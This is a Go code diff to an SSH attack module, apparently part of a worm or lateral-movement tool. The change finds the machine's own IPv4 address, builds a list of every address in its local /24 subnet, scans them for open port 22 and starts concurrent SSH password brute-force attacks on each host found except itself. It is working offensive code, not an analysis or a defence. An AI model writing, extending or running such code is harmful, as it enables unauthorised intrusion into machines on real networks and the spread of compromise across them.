@@ -3,6 +3,7 @@ package ssh
 import (
 	"fmt"
 	"io/ioutil"
+	"net"
 	"strings"
 
 	"sync"
@@ -34,10 +35,13 @@ func (a *Attack) Run() {
 		a.wg = new(sync.WaitGroup)
 	}
 
+	localIP := getLocalIP()
+	blocal := strings.Split(localIP, ".")
+
 	var hs []string
 
-	for i := 0; i < 7; i++ {
-		hs = append(hs, fmt.Sprintf("192.168.0.%d", i))
+	for i := 0; i < 255; i++ {
+		hs = append(hs, fmt.Sprintf("%s.%s.%s.%d", blocal[0], blocal[1], blocal[2], i))
 	}
 
 	s := scanner.Scanner{}
@@ -48,7 +52,7 @@ func (a *Attack) Run() {
 	for host := range hosts {
 		port := strings.Split(host, ":")[1]
 		addr := strings.Split(host, ":")[0]
-		if port == "22" && addr != "192.168.0.2" {
+		if port == "22" && addr != localIP {
 			fmt.Println("[*] starting brute force for", host)
 			a.wg.Add(1)
 			go a.bruteForce(host)
@@ -198,4 +202,20 @@ func getSSHSession(host, username, password string) (*ssh.Session, error) {
 
 	// Create a new ssh session
 	return client.NewSession()
+}
+
+func getLocalIP() string {
+	addrs, err := net.InterfaceAddrs()
+	if err != nil {
+		return ""
+	}
+	for _, address := range addrs {
+		// check the address type and if it is not a loopback the display it
+		if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
+			if ipnet.IP.To4() != nil {
+				return ipnet.IP.String()
+			}
+		}
+	}
+	return ""
 }
